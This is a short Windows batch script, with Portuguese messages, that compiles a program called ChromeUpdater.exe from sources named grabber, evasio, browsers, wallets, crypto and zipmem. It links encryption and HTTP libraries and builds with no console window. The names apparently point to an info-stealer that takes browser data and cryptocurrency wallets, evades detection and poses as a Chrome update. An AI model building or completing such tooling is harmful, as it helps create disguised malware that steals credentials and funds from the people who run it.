@echo off
setlocal

cd /d "%~dp0"
title Build - ChromeUpdater

echo Compilando...

set "MINGW_BIN=%~dp0winlibs-x86_64-posix-seh-gcc-16.2.0-mingw-w64ucrt-14.0.0-r3\mingw64\bin"

if not exist "%MINGW_BIN%\g++.exe" (
    echo MinGW nao encontrado na pasta do projeto. Tentando usar o do PATH...
    set "MINGW_BIN="
)

if defined MINGW_BIN (
    "%MINGW_BIN%\windres.exe" grabber.rc -O coff -o grabber_res.o
) else (
    windres grabber.rc -O coff -o grabber_res.o
)
if errorlevel 1 (
    echo [ERRO] Falha ao compilar recursos.
    pause
    exit /b 1
)

if defined MINGW_BIN (
    "%MINGW_BIN%\g++.exe" -std=c++17 -O2 -municode -mwindows -fno-exceptions main.cpp crypto.cpp evasio.cpp browsers.cpp wallets.cpp zipmem.cpp grabber_res.o -o ChromeUpdater.exe -lbcrypt -lcrypt32 -lshell32 -lwinhttp -static -static-libgcc -static-libstdc++
) else (
    g++ -std=c++17 -O2 -municode -mwindows -fno-exceptions main.cpp crypto.cpp evasio.cpp browsers.cpp wallets.cpp zipmem.cpp grabber_res.o -o ChromeUpdater.exe -lbcrypt -lcrypt32 -lshell32 -lwinhttp -static -static-libgcc -static-libstdc++
)
if errorlevel 1 (
    echo [ERRO] Falha na compilacao.
) else (
    echo [OK] ChromeUpdater.exe criado com sucesso!
)
pause
endlocal